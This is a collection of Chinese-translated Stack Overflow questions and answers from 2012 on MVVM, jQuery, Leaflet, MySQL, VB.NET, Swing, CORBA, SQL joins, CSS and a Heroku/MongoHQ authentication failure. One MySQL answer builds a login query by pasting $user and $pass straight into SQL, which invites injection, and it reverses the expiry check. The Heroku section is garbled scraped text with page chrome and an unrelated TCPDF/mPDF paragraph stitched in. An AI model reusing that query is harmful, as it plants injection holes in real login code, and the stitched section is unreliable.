我在 MVVM 中的处理程序：

```
ScrollCommand = new RelayCommand<ScrollChangedEventArgs>(e =>
            {
                MessageBox.Show("HorizontalChange " + e.HorizontalChange");
            }); 
```

处理程序被调用，但 e 为空。我做错了什么，我怎么能得到那个 Args？

作为 mvvm 基础，我使用 mvvm-light。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T13:06:04.370

您好，您应该在 EventToCommand 上将 PassEventArgsToCommand 设置为 true。

# c# - 分页符在子报表 (rdlc) 中不起作用

> ID：11735887
> 
> 赞同：1
> 
> 时间：2012-07-31T08:17:40.963
> 
> 标签：c#, report, rdlc

我有主报告和子报告。

在子报告中，我添加了一个破坏字符串的组 (=Int((RowNumber(Nothing)-1)/10))。如果我试图在父报告之外显示子报告，那会很好，但如果我试图在父报告中显示，那将行不通。

有任何想法吗？

提前致谢。

# jquery - 在不使用 `window.open` 或 `window.location.href` 的情况下打开新窗口/选项卡

> ID：11735889
> 
> 赞同：2
> 
> 时间：2012-07-31T08:17:59.263
> 
> 标签：jquery, html, dynamic, new-window

我想生成一个在创建后立即单击的链接，但没有任何反应

代码：

```
var link = $("<a></a>");
link.attr("href", "/dostuff.php");
link.attr("target", "_blank");
link.click(); 
```

属性设置正确：

```
var link = $("<a></a>");
link.attr("href", "/dostuff.php");
link.attr("target", "_blank");
var linkcheck = link.wrap('<p>').parent().html();
console.log(linkcheck); 
```

这将返回：

```
<a href="/dostuff.php" target="_blank"></a> 
```

没有错误

* * *

## 更新

我试图附加它，将点击绑定到它，点击它并删除它

```
var link = $("<a></a>");
link.attr(
{
    id    : "linky",
    href  : "/dostuff.php",
    target: "_blank"
});
$("body").append(link);
$("#linky").on("click", function() { console.log("Link clicked"); });
$("#linky").click();
$("#linky").remove(); 
```

正在执行单击操作，但未执行默认操作（打开链接）。

* * *

## 更新2

我找到了解决方案：创建并提交一个`<form>`！[看我的回答。](https://stackoverflow.com/a/11736910/1062281)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T09:22:15.133

我有答案。显然 jQuery 不支持以[编程方式单击链接的默认行为](https://stackoverflow.com/a/1694803/1062281)

虽然创建和提交表单效果很好（在`Chrome 26`和`FF 20`中测试`IE 8`）：

```
var form = $("<form></form>");
form.attr(
{
    id     : "newform",
    action : "https://google.nl",
    method : "GET",
    target : "_blank"        // Open in new window/tab
});

$("body").append(form);
$("#newform").submit();
$("#newform").remove(); 
```

它能做什么：

1.  创建表单
2.  给它属性
3.  将其附加到 DOM 以便可以提交
4.  提交
5.  从 DOM 中删除表单

现在你有一个新的标签/窗口加载“ [https://google.nl](https://google.nl) ”（或任何你想要的 URL，只需替换它）。不幸的是，当您尝试以这种方式一次打开多个窗口时，在尝试打开第二个窗口（第一个仍然打开）时，您会收到一个弹出窗口阻止的消息栏。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:55:37.923

关于您更新的脚本：如果您选择正确 ( `$("#linky")`) 它可以工作。

```
var link = $("<a id='linky'>Hello</a>");
link.attr("href", "/dostuff.php");
link.attr("target", "_blank");
$("body").append(link);
$("#linky").on("click", function() {alert("hai");});
$("#linky").click();
$("#linky").remove(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T09:01:13.550

```
var link = $("<a id='linky'></a>");
link.attr("href", "/dostuff.php");
link.attr("target", "_blank");
$("body").append(link);
$("linky").live("click", function() {alert("hai"); $(this).remove()});
$("linky").click();
//$("linky").remove(); 
```

所以你实际上对点击事件做出反应。是的！问题是你为什么要这样做？

# ios - 同步 UITableView 单元格插入和调整视图大小的动画

> ID：11735890
> 
> 赞同：5
> 
> 时间：2012-07-31T08:18:06.490
> 
> 标签：ios, uitableview, core-animation

我正在实现一个自定义视图，它有一个 UITableView 作为子视图。这个自定义视图也是上述 UITableView 的委托。我的意图是有两个级别的单元格。可以单击较高级别的，以便它们折叠并显示较低级别的。

![未折叠](../Images/838cfb88078060633815c12e678ee1ea.png)

通过按下名为“B 类”的单元格，这应该会发生：

![倒塌](../Images/e5d055f2cf121c5e001d26553ee0e4d5.png)

正如您在图片中看到的，当单击（并`-tableView:didSelectRowAtIndexPath:`调用）第一级单元格时，表格会展开（我`-insertRowsAtIndexPaths:withRowAnimation:`用来将“子类别 B1”插入表格中）。

我希望这个自定义视图与内部表格的可见内容大小完全相同。现在，在插入新单元格后，我告诉自定义视图用新的 UITableView 内容高度重置它的框架。

问题来自动画：我无法同步 UITableView 插入动画和自定义视图的框架改变它的高度。我可以让视图展开然后为插入设置动画，或者先为插入设置动画然后更改自定义视图的框架。

**有没有办法同步这些动作，以便它们在单个动画中执行？**

# firefox - Firefox 使用 jquery 读取单元格元素时未定义的值

> ID：11735892
> 
> 赞同：1
> 
> 时间：2012-07-31T08:18:35.643
> 
> 标签：firefox, undefined, tablerow

我有一个动态填充的表（使用更新面板），然后当用户单击所选行时，所有数据都将写入标签。在 IE 和 chrome 中运行良好，但 firefox 说未定义。有 5 列的简单表格。我使用以下内容动态绑定到表：（请原谅代码膨胀）

```
 $('#tblResults').delegate(".aRow", "click", function () {
            var thatID = this.id;
            if (thatID != "0") {
                var wordz = "";
                var specialID = document.getElementById("hiddenChosenContact");
                var targetContact = document.getElementById("theContactLabel");

                for (var i = 1; i <= this.cells.length - 1; i++) {
                    if (i == this.cells.length - 1)
                        wordz = wordz + this.cells[i].innerText;
                    else
                        wordz = wordz + this.cells[i].innerText + " - ";
                }

                targetContact.innerHTML = wordz;
                specialID.value = thatID;
            }
            else {

            }
     }); 
```

该行在加载时被赋予一个 id 和类名“aRow”。我尝试只使用完整的 jquery，$(this)，但老实说，我不确定表操作的语法。

**编辑。抱歉，意思是未定义的值包含在 this.cells[i].innerText 中

**HTML 编辑

```
<table class="cvTableG" id="tblResults" cellPadding="0" cellSpacing="0" style="clear:left; width:100%; font-size:10px;">
            <thead>
              <tr class="aRow" id="1"><th width="14px;">&nbsp;</th>
                <th align="left" width="85px">Name</th>
                <th align="left" width="90px">Surname</th>
                <th align="left">Department</th>
                <th align="left">Customer</th>
              </tr>
            </thead>
            <tbody>
              <tr class="aRow" id="2">
                <td style="padding:0;"><input type="radio" name="myRadio" /></td>
                <td>Marty</td>
                <td>Elliott</td>
                <td>Development Place</td>
                <td>Rosebank</td>
              </tr>
              <tr class="aRow" id="3">
              <td style="padding:0;"><input type="radio" name="myRadio" /></td>
                <td>Sarah</td>
                <td>Lee</td>
                <td>Dev Place</td>
                <td>JHB</td>
              </tr>
               <tr class="aRow" id="4">
               <td style="padding:0;"><input type="radio" name="myRadio" /></td>
                <td>Marty</td>
                <td>Elliott</td>
                <td>Halfway House</td>
                <td>Durban</td>
              </tr></tbody></table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:42:27.757

我曾经遇到过仅在 Firefox 中出现的 Jquery 选择器问题。如果我没记错的话，解决方案是添加与 id 具有相同值的 name 属性。因此，在您的情况下，它将是：

```
<table class="cvTableG" id="tblResults" name="tblResults"> 
```

试试看，让我知道它是否有效。

我找到了教程，你可能想尝试这样的事情：

* * *

例如，以下 .delegate() 代码：

```
$("table").delegate("td", "click", function() {
  $(this).toggleClass("chosen");
}); 
```

等效于使用 .on() 编写的以下代码：

```
$("table").on("click", "td", function() {
  $(this).toggleClass("chosen");
}); 
```

也许它会这样工作？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T15:31:42.903

Firefox 没有实现非标准`innerText`属性。您是否想要`textContent`，这*是*标准化的？

# javascript - 如何使用传单添加地图控件？

> ID：11735896
> 
> 赞同：0
> 
> 时间：2012-07-31T08:18:51.667
> 
> 标签：javascript, leaflet

我正在努力打开 Leaflet 中的地图控件。

盯着这个例子似乎没有帮助。我知道我一定犯了一个愚蠢的错误，但我想不通。

[http://leaflet.cloudmade.com/examples/layers-control.html](http://leaflet.cloudmade.com/examples/layers-control.html)

我有我的地图，它加载，显示正常，但在`addTo(map)`我得到错误的方法：

> 未捕获的类型错误：无法调用未定义的方法“addTo”

有什么我想念的想法吗？

```
var osmUrl='http://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png';
var osmAttrib='Map data &copy; <a href="http://openstreetmap.org">OpenStreetMap</a> contributors';
var street_layer = new L.TileLayer(osmUrl, {minZoom: 8, maxZoom: 18, attribution: osmAttrib});
map = new L.Map('map',{
                center: initial_center,
                zoom: initial_zoom,
                layers: mapLayersList    
});
var baseMaps = {"Streets": street_layer};
L.Control.Layers(baseMaps, null).addTo(map); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:48:14.443

```
L.Control.Layers(baseMaps, null).addTo(map); 
```

是错的。这是

```
L.control.layers(baseMaps, null).addTo(map); 
```

[您可以在此处](http://jsfiddle.net/kidmenot/7sNcF/)查看脚本的 jsfiddle

# php - MySql中的帐户过期

> ID：11735901
> 
> 赞同：1
> 
> 时间：2012-07-31T08:19:05.380
> 
> 标签：php, mysql, event-handling

我正在一个网站上工作，那里有注册用户，持续时间为 6 个月或一年。我为每个用户节省了注册时间。现在我使用 PHP 来处理这种情况。每次用户登录时，我都会检查用户名和密码，并检查注册日期后的时间是否结束。

有什么方法可以使用 mysql 为我自动处理这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:21:42.433

在查询 where 子句（验证用户）中使用一组额外的条件，仅在满足额外条件时才会选择用户详细信息：

```
where
    // normal clauses
    and userExpires>CURDATE() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:55:52.983

You can also try this one:

```
select * from tbl where username = $user AND password = $pass AND SYSDATE() > DATE_ADD(registration_date, INTERVAL 6 MONTH) 
```

# vb.net - 在 VB.NET 中对对象列表进行排序

> ID：11735902
> 
> 赞同：61
> 
> 时间：2012-07-31T08:19:10.503
> 
> 标签：vb.net, list, sorting, object

我有一个乘客（对象）列表，其中有不同的属性..

```
passenger.name
passenger.age
passenger.surname 
```

我想按年龄标准对这个列表进行排序，我该怎么做？

我知道在整数/字符串列表中 List.Sort() 有效，但如果是对象列表，我不知道它是否可以按对象属性的值排序！

谢谢。

* * *

## 回答 #1

> 赞同：142
> 
> 时间：2012-07-31T08:26:12.180

要按对象中的属性排序，您必须指定比较器或方法来获取该属性。

使用`List.Sort`方法：

```
theList.Sort(Function(x, y) x.age.CompareTo(y.age)) 
```

使用`OrderBy`扩展方法：

```
theList = theList.OrderBy(Function(x) x.age).ToList() 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-12-15T17:39:58.550

如果您需要自定义字符串排序，您可以创建一个函数，该函数根据您指定的顺序返回一个数字。

例如，我有一些照片，我想根据正面或扣环进行分类。所以我做了以下事情：

```
Private Function sortpictures(s As String) As Integer
    If Regex.IsMatch(s, "FRONT") Then
        Return 0
    ElseIf Regex.IsMatch(s, "SIDE") Then
        Return 1
    ElseIf Regex.IsMatch(s, "CLASP") Then
        Return 2
    Else
        Return 3
    End If
End Function 
```

然后我这样调用排序函数：

```
list.Sort(Function(elA As String, elB As String)
                  Return sortpictures(elA).CompareTo(sortpictures(elB))
              End Function) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-22T10:40:21.987

您必须实现 IComparer 接口。

在这个示例中，我有我的自定义对象 JSONReturn，我像这样实现我的类：

```
Friend Class JSONReturnComparer
    Implements IComparer(of JSONReturn)

    Public Function Compare(x As JSONReturn, y As JSONReturn) As Integer Implements    IComparer(Of JSONReturn).Compare
        Return String.Compare(x.Name, y.Name)
    End Function

End Class 
```

我这样称呼我的排序列表方法：alResult.Sort(new JSONReturnComparer())

也许它可以帮助你

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-10-26T12:22:49.110

尝试..

Dim sortedList = From entry In mylist Order By entry.name Ascending Select entry

mylist = sortedList.ToList

# java - 登录 SwingWorker

> ID：11735903
> 
> 赞同：0
> 
> 时间：2012-07-31T08:19:17.057
> 
> 标签：java, swing, swingworker

我有一个扩展类`SwingWorker<Void, Void>`。如果成功更改布局并将新面板添加到框架中，我应该在它的后台线程中进行登录。所以 Swing 工作人员执行以下 3 项任务：

1.  登录
2.  更改布局
3.  添加/删除面板。

所以我在 doInBackground() 方法中编写了这个函数。但是这里发生的是这 3 个方法总是被执行，无论登录是否成功。如果登录失败，我想停止执行工作人员。我尝试了 cancel() 方法，但没有奏效。我怎样才能以正确的方式做到这一点？*在 SwingWorker 中执行登录任务的正确方法是什么？*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:37:34.777

第二步和第三步不能在`doInBackground()`方法中完成，因为它们使用 Swing 组件，因此必须在事件调度线程中完成。`done()`如果登录成功，它们必须在方法中完成。

所以你的 SwingWorker 应该是一个`SwingWorker<Boolean, Void>`. 如果登录成功，该`doInBackground()`方法应返回 true，否则返回 false：

```
SwingWorker<Boolean, Void> loginWorker = new SwingWorker<Boolean, Void>() {
    protected Boolean doInBackground() {
        return login();
    }

    protected void done() {
        try {
            boolean loginSuccessful = get();
            if (loginSuccessful) {
                updateGUI();
            }
        }
        catch (Exception e) {
            displayErrorMessage(e);
        }
    }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:36:55.037

正如 Robin 所说，使用 return。实际上，步骤 1 应该在后台线程中完成，而步骤 2 和 3 应该在事件调度线程中完成。所以

```
protected Void doInBackground() {
    boolean success = login();
    this.setSuccess(success); // so that other thread knows whether you logged in
}

protected void done() {
    if (this.getSuccess()) {
//Change layout
//Add/remove panels.
    }
} 
```

# c++ - Corba Naming_Service 创建了如此多的 UDP 连接

> ID：11735904
> 
> 赞同：0
> 
> 时间：2012-07-31T08:19:28.273
> 
> 标签：c++, corba, ace, tao

Corba Naming_Service 创建了如此多的 UDP 连接，即使客户端断开连接，它们仍然存在。它最多可连接 60K 连接。

AIX 5.3、TAO 版本 1.5a_p22 和 ACE 版本 5.5a_p22

下面是losf：

```
Naming_Se 692382 slist  319u  IPv4 0xf10006000f914200             0t0    UDP *:*
Naming_Se 692382 slist  320u  IPv4 0xf10006000d224800             0t0    UDP *:*
Naming_Se 692382 slist  321u  IPv4 0xf1000600109d6200             0t0    UDP *:*
Naming_Se 692382 slist  322u  IPv4 0xf10006000961b600             0t0    UDP *:*
Naming_Se 692382 slist  323u  IPv4 0xf1000600027fde00             0t0    UDP *:*
Naming_Se 692382 slist  324u  IPv4 0xf10006000acd8a00             0t0    UDP *:*
Naming_Se 692382 slist  325u  IPv4 0xf100060009aa8200             0t0    UDP *:*
Naming_Se 692382 slist  326u  IPv4 0xf100060009854800             0t0    UDP *:*
Naming_Se 692382 slist  327u  IPv4 0xf100060002bce400             0t0    UDP *:*
Naming_Se 692382 slist  328u  IPv4 0xf1000600094a3a00             0t0    UDP *:*
Naming_Se 692382 slist  329u  IPv4 0xf10006000b4bdc00             0t0    UDP *:*
Naming_Se 692382 slist  330u  IPv4 0xf10006000017aa00             0t0    UDP *:*
Naming_Se 692382 slist  331u  IPv4 0xf100060004453200             0t0    UDP *:*
Naming_Se 692382 slist  332u  IPv4 0xf100060009342200             0t0    UDP *:* 
```

在哪里/如何解决这个问题？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T05:01:13.180

问题是 AceTao Naming_Service 在连接时会创建新的 UDP 套接字，即使客户端断开连接，它也会保留为转储。我认为这是ACE5.5 TAO1.5中的错误。升级到ACE5.6 TAO1.6 p13 解决了这个问题。

# sql - 如何在 vb6 中使用 sql 在具有多列比较的两个不同表上创建包含方法

> ID：11735909
> 
> 赞同：1
> 
> 时间：2012-07-31T08:19:35.570
> 
> 标签：sql, vb6, comparison, contains

我的数据库中有（Table1.column1 和 Table1.column2）和另一个（Table2.column1 和 Table2.column2），我想得到结果，其中（Table1.column1 和 Table1.column2）值在（Table2.column1 和 Table2 中找不到） .column2）？

```
Table1                          Table2
------------------------        ------------------------
 sid   sname    sclass            rid  rname    rclass
------------------------        ------------------------
| 1 | glass  | a class |        | 1 | glass  | b class |
| 2 | glass  | c class |        | 2 | glass  | c class |
| 3 | ice    | a class |        | 3 | ice    | b class |
| 4 | ice    | b class |        | 4 | ice    | c class |
| 5 | fridge | a class |        | 5 | fridge | a class |
| 5 | fridge | b class |        | 5 | fridge | c class |
------------------------        ------------------------ 
```

结果应该是：

```
Result Table
------------------------
 sid   sname    sclass 
------------------------
| 1 | glass  | a class |
| 3 | ice    | a class |
| 5 | fridge | b class |
------------------------ 
```

正如我上面提到的，这类似于 contains 方法，但我将在 VB6 中使用这个 SQL 字符串。

有 a、b 和 c 类。每个项目（例如玻璃、冰箱等）都可以包含这些类中的任何一个，因此我的结果中不应存在 table2 的任何组合。

我想用 sql 查询来做到这一点，就像：

```
SELECT * 
  FROM area1 AS table1,
       (SELECT * FROM area2 WHERE blablabla..) AS table2
 WHERE table1.SNAME = table2.RNAME
   AND table1.sclass <> table2.rclass 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:32:32.740

你需要一个`left join`

```
SELECT sid, sname, sclass
FROM table1
    LEFT JOIN table2
    ON table1.sname=table2.rname
    AND table1.sclass=table2.rclass
WHERE rid is null 
```

# html - 关于图像包装的建议？

> ID：11735915
> 
> 赞同：0
> 
> 时间：2012-07-31T08:19:57.690
> 
> 标签：html, css

我正在尝试做 a `floating design`，但是当我调整浏览器的大小时，`<p>`标签旁边的`<img>`标签开始布局成一列，而不是在图像下方。你可以在这里看到代码 -> [http://funkz.nfshost.com/](http://funkz.nfshost.com/) 它在“**`main-bottom-post**" ID .` 我也搜索过网络，但大多数文章都是相反的 - 在img旁边制作一个专栏。在此先感谢， MK

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:41:22.723

在 css 中试试这个：`display:inline-block`当你调整浏览器的大小时，你会成功

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:10:19.420

当您希望在图像下移动并在其上应用 a时，您将不得不使用[媒体查询](https://developer.mozilla.org/en/CSS/Media_queries/)来定位特定的分辨率。`<p class="post-text">``float: left;`

例如 ：

```
/* Smartphones (portrait and landscape) ----------- */
@media only screen 
and (min-device-width : 320px) 
and (max-device-width : 480px) {
    p.post-text {
        float: left;
    }
} 
```

这将使您`<p class="post-text">`在图像下方浮动，屏幕宽度介于**480px**和**320px**之间。

您可能还想查看[此](http://css-tricks.com/snippets/css/media-queries-for-standard-devices/)内容以获取更多参考。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:15:50.210

尝试给予`position`财产。

或尝试`media queries`

```
@media screen and (min-width: xxpx) {
   div {width: xxpx;}
 } 
```

试试这个链接

[http://webdesignerwall.com/tutorials/responsive-design-with-css3-media-queries](http://webdesignerwall.com/tutorials/responsive-design-with-css3-media-queries)

[http://www.danstorm.com/dan-storm-article-css-15.html](http://www.danstorm.com/dan-storm-article-css-15.html)

# jquery - 如何将一个花哨的盒子放在另一个花哨的盒子里

> ID：11735918
> 
> 赞同：1
> 
> 时间：2012-07-31T08:20:07.650
> 
> 标签：jquery, fancybox

我想在弹出窗口中创建一个弹出窗口。

我有一个缩略图图像，当我单击它时，它会使用精美的框弹出大图像。现在我想以这样的方式，当我将鼠标悬停在大图像中的一个点上时，它应该在它上面弹出另一个图像。

如何使这成为可能。如果有人有链接示例，那么它会更有帮助。

我们可以在另一个花哨的盒子里放一个花哨的盒子吗？

# ruby-on-rails-3 - Heroku & MongoHQ: ActionView::Template::Error (操作:# 我有一个带有 MongoID 3 的 Rails 3 应用程序成功部署到 Heroku（使用 MongoHQ）——但随后发生了一些事情（无法确定它到底是什么）并且构建开始在 问问题 问问题 2012-07-31T08:20:21.157 2907 次 This question shows research effort; it is useful and clear 22 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. 我有一个带有 MongoID 3 的 Rails 3 应用程序成功部署到 Heroku（使用 MongoHQ）——但随后发生了一些事情（无法确定它到底是什么）并且构建开始在 Heroku 上崩溃。 所以这是我得到的错误： TLDR： Moped::Errors::AuthenticationFailure (The operation: #<moped::protocol::commands::authenticate ...="" failed="" with="" error="" "auth="" fails")="" 使调试变得更加困难的原因是它在="" localhost="" 上运行良好。现在我已经没有想法了，这可能是什么。="" app[web.1]:="">> Thin web server (v1.4.1 codename Chromeo) app[web.1]: >> Maximum connections set to 1024 app[web.1]: >> Listening on 0.0.0.0:58731, CTRL+C to stop heroku[web.1]: State changed from starting to up app[web.1]: app[web.1]: app[web.1]: Started GET "/" for 212.86.9.90 at 2012-07-31 08:08:07 +0000 heroku[router]: GET cool-name-123.herokuapp.com/ dyno=web.1 queue=0 wait=0ms service=171ms status=200 bytes=1286 heroku[router]: GET cool-name-123.herokuapp.com/assets/application-8e7bfeeffc9291864e5b42d908c2fdda.css dyno=web.1 queue=0 wait=0ms service=11ms status=200 bytes=92524 heroku[router]: GET cool-name-123.herokuapp.com/assets/application-aa557bde70f1236cdf90c913043c4382.js dyno=web.1 queue=0 wait=0ms service=16ms status=200 bytes=122836 heroku[router]: GET cool-name-123.herokuapp.com/favicon.ico dyno=web.1 queue=0 wait=0ms service=3ms status=200 bytes=0 app[web.1]: app[web.1]: app[web.1]: Started GET "/originals/new" for 212.86.9.90 at 2012-07-31 08:08:11 +0000 heroku[router]: GET cool-name-123.herokuapp.com/originals/new dyno=web.1 queue=0 wait=0ms service=31ms status=200 bytes=1808 app[web.1]: app[web.1]: app[web.1]: Started POST "/originals" for 212.86.9.90 at 2012-07-31 08:08:34 +0000 app[web.1]: app[web.1]: Moped::Errors::AuthenticationFailure (The operation: #<moped::protocol::commands::authenticate app[web.1]:="" @length="154" @request_id="3" @response_to="0" @op_code="2004" @flags="[]" @full_collection_name="app123.$cmd" @limit="-1" @skip="0" @selector="{:authenticate=">1, :user=>"heroku", :nonce=>"xyz", :key=>"xyz"} heroku[router]: POST cool-name-123.herokuapp.com/originals dyno=web.1 queue=0 wait=0ms service=1486ms status=500 bytes=643 app[web.1]: @fields=nil> app[web.1]: failed with error "auth fails"): app[web.1]: app/controllers/originals_controller.rb:19:in `block in create' app[web.1]: app/controllers/originals_controller.rb:18:in `create' app[web.1]: app[web.1]: heroku[router]: GET cool-name-123.herokuapp.com/favicon.ico dyno=web.1 queue=0 wait=0ms service=3ms status=304 bytes=0 app[web.1]: app[web.1]: app[web.1]: Started GET "/" for 212.86.9.90 at 2012-07-31 08:09:40 +0000 heroku[router]: GET cool-name-123.herokuapp.com/ dyno=web.1 queue=0 wait=0ms service=11ms status=304 bytes=0 我最近在 Heroku 上苦苦挣扎，因此我认为我应该有正确的设置来选择数据库驱动程序和服务（在 Gemfile 中使用新的 yml 方案 + Ruby 1.9.3）。 当我跑步时，heroku config --app app_name我得到 DATABASE_URL => postgres://rhalppyjrb:xyz@ec2-xyz.compute-1.amazonaws.com/rhalppyjrb GEM_PATH => vendor/bundle/ruby/1.9.1 LANG => en_US.UTF-8 MONGOHQ_URL => mongodb://heroku:xyz@flame.mongohq.com:27054/app123 PATH => bin:vendor/bundle/ruby/1.9.1/bin:/usr/local/bin:/usr/bin:/bin RACK_ENV => production RAILS_ENV => production SHARED_DATABASE_URL => postgres://rhalppyjrb:xyz@ec2-123.compute-1.amazonaws.com/rhalppyjrb 我的 mongoid.yml 看起来像这样： production: sessions: default: uri: <%= ENV['MONGOHQ_URL'] %> options: consistency: :strong skip_version_check: true safe: true Gemfile 是这样的： source 'https://rubygems.org' gem 'bundler', '1.2.0.rc' ruby '1.9.3' gem 'rails', '3.2.6' gem 'thin' gem 'rmagick', :require => 'RMagick' gem "carrierwave-mongoid", :git => "git://github.com/jnicklas/carrierwave-mongoid.git", :branch => "mongoid-3.0", :require => 'carrierwave/mongoid' group :assets do gem 'sass-rails', '~> 3.2.3' gem 'coffee-rails', '~> 3.2.1' gem 'uglifier', '>= 1.0.3' gem "therubyracer", :platform => :ruby end gem 'jquery-rails' gem "haml", ">= 3.1.6" gem "mongoid", ">= 3.0.3" gem "devise", ">= 2.1.2" gem "devise_invitable", ">= 1.0.2" gem "cancan", ">= 1.6.8" gem "rolify", ">= 3.1.0" gem "bootstrap-sass", ">= 2.0.4.0" gem "simple_form" group :development do gem "guard", ">= 0.6.2" gem 'rb-fsevent' gem 'growl' gem "haml-rails", ">= 0.3.4" gem "guard-bundler", ">= 0.1.3" gem "guard-rails", ">= 0.0.3" gem "guard-livereload", ">= 0.3.0" gem "guard-rspec", ">= 0.4.3" end group :test do gem "database_cleaner", ">= 0.8.0" gem "mongoid-rspec", "1.4.6" gem "email_spec", ">= 1.2.1" end group :development, :test do gem "factory_girl_rails", ">= 3.5.0" gem "rspec-rails", ">= 2.11.0" end 我在处理大文件和 TCPDF 时也遇到了麻烦。我从 TCPDF 切换到 mPDF。该项目基于 FPDF 和 HTML2PDF，并且通过 HTML 解析速度更快。 例如，TCPDF 花了大约 70 到 80 秒的时间进行文章详细概述（150 页的图片、链接和一些东西）。 相同的 HTML 代码和相同的 PHP 脚本刚刚替换为 mPDF 类和函数，只需 6 到 8 秒即可创建相同的 PDF。 ruby-on-rails-3herokumongoidmongohqmoped 4 1 回答 1 This answer is useful 20 问题是您的身份验证凭据不再正确。具体来说，您尝试验证的用户不再存在。 原因是当你做的时候rake db:reseed所有的数据都被删除了，包括数据库级别的用户。 例子： ➜ skadi git:(master) ✗ mongo MongoDB shell version: 2.0.7 connecting to: test > use skadi_development switched to db skadi_development > db.system.users.find() > db.addUser("joe", "passwordForJoe") { "n" : 0, "connectionId" : 191, "err" : null, "ok" : 1 } { "user" : "joe", "readOnly" : false, "pwd" : "dac588613249fe92703afb262ec53b82", "_id" : ObjectId("5030d5181cefbd2b04a99e30") } > db.system.users.find() { "_id" : ObjectId("5030d5181cefbd2b04a99e30"), "user" : "joe", "readOnly" : false, "pwd" : "dac588613249fe92703afb262ec53b82" } > exit bye ➜ skadi git:(master) ✗ rake db:reseed ➜ skadi git:(master) ✗ mongo MongoDB shell version: 2.0.7 connecting to: test > use skadi_development switched to db skadi_development > db.system.users.find() => Nothing 因此，当您尝试连接到数据库时，您的凭据不再有效。 您可以在 MongoHQ 管理面板中进行检查。您可以通过转到 Heroku，选择您的应用程序，单击资源并单击 MongoHQ 来找到它。然后单击数据库用户选项卡。 rake db:reseed以前可以按您的预期工作，但是随着新版本的 mongoid 发生了变化。为了删除除 system.* 之外的所有集合，您可以使用rake db:purge. 您可能需要使用 master 分支，因为该 rake 任务在稳定版本中尚不可用。或者只是Mongoid.purge!在您的代码中使用，它可以稳定运行。 详情：https ://github.com/mongoid/mongoid/issues/2275 于 2012-08-19T11:52:38.857 回答 Related 1 uml - UML 状态图的正确方法 0 c# - 在客户端捕获 C# 错误 1 tomcat - Tomcat 6.0.37 无法从 LDAP 检索用户名 1 javascript - 如何根据单选按钮选择显示不同的跨度？ 1 javascript - 如何在 Jquery 的选项卡中包含选项卡...？ 2 java - 服务器 500 错误是安全问题吗？ 3 ios - ios - 如何从 NSMutableArray 中获取浮点数的总和 3 ios - 从Objective c中的另一个类初始化属性 1 powershell - 不知道文件路径时，用 PS 替换驱动程序文件中的文本字符串 0 symfony - 如何更改 Symfony2 响应内容类型？ Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641</moped::protocol::commands::authenticate></moped::protocol::commands::authenticate>

> ID：11735921
> 
> 赞同：22
> 
> 时间：
> 
> 标签：ruby-on-rails-3, heroku, mongoid, mongohq, moped

我有一个带有 MongoID 3 的 Rails 3 应用程序成功部署到 Heroku（使用 MongoHQ）——但随后发生了一些事情（无法确定它到底是什么）并且构建开始在 Heroku 上崩溃。

所以这是我得到的错误：

**TLDR：** `Moped::Errors::AuthenticationFailure (The operation: #<Moped::Protocol::Commands::Authenticate ... failed with error "auth fails")`

使调试变得更加困难的原因是它在 localhost 上运行良好。现在我已经没有想法了，这可能是什么。

```
app[web.1]: >> Thin web server (v1.4.1 codename Chromeo)
app[web.1]: >> Maximum connections set to 1024
app[web.1]: >> Listening on 0.0.0.0:58731, CTRL+C to stop
heroku[web.1]: State changed from starting to up
app[web.1]: 
app[web.1]: 
app[web.1]: Started GET "/" for 212.86.9.90 at 2012-07-31 08:08:07 +0000
heroku[router]: GET cool-name-123.herokuapp.com/ dyno=web.1 queue=0 wait=0ms service=171ms status=200 bytes=1286
heroku[router]: GET cool-name-123.herokuapp.com/assets/application-8e7bfeeffc9291864e5b42d908c2fdda.css dyno=web.1 queue=0 wait=0ms service=11ms status=200 bytes=92524
heroku[router]: GET cool-name-123.herokuapp.com/assets/application-aa557bde70f1236cdf90c913043c4382.js dyno=web.1 queue=0 wait=0ms service=16ms status=200 bytes=122836
heroku[router]: GET cool-name-123.herokuapp.com/favicon.ico dyno=web.1 queue=0 wait=0ms service=3ms status=200 bytes=0
app[web.1]: 
app[web.1]: 
app[web.1]: Started GET "/originals/new" for 212.86.9.90 at 2012-07-31 08:08:11 +0000
heroku[router]: GET cool-name-123.herokuapp.com/originals/new dyno=web.1 queue=0 wait=0ms service=31ms status=200 bytes=1808
app[web.1]: 
app[web.1]: 
app[web.1]: Started POST "/originals" for 212.86.9.90 at 2012-07-31 08:08:34 +0000
app[web.1]: 
app[web.1]: Moped::Errors::AuthenticationFailure (The operation: #<Moped::Protocol::Commands::Authenticate
app[web.1]:   @length=154
app[web.1]:   @request_id=3
app[web.1]:   @response_to=0
app[web.1]:   @op_code=2004
app[web.1]:   @flags=[]
app[web.1]:   @full_collection_name="app123.$cmd"
app[web.1]:   @limit=-1
app[web.1]:   @skip=0
